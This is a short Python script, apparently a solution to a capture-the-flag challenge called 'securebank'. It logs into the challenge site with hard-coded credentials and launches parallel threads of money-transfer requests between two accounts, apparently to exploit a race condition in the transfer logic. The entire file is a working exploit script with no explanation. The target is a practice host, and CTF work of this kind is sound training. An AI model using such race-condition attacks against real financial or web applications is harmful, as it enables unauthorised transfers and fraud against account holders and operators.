import requests
from threading import Thread

chal = 'https://d583fc101b2bd13851584d19-securebank.challenge.master.cscg.live:31337/'


def get_session():
    data = {'username':'john','password':'johndoe'}
    c = requests.get(chal).cookies['PHPSESSID']
    cookies = {'PHPSESSID':c}
    requests.post(chal+'index.php?page=login',data=data,cookies=cookies)
    
    return cookies

def transfer(n):
    data = {'source':'EU42SECB00051380016',
    'destination':'EU88SECB00051380017',
    'amount':n}
    
    g = lambda : requests.post(chal+'?page=transfer',cookies=get_session(),data=data)
    Thread(target=g).start()

for _ in range(4):
    transfer(5)